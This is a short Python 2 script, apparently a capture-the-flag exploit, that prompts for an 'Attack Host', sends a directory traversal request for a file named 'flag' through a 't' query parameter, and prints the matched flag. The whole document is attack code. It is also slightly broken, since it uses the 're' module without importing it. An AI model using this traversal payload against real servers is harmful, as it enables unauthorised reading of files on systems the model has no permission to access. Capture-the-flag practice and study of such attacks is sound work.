import requests

def include(host):
    r = requests.get(url="http://%s/?t=../../../../../../flag"%host)
    flags = re.findall(r'^(.+?)<',r.content)
    if flags:
        return "[+] Flag is "+flags[0]
    else:
        return "[-] Error Pwn!"
    
if __name__ == "__main__":
    host = raw_input("[*] Attack Host:")
    print include(host)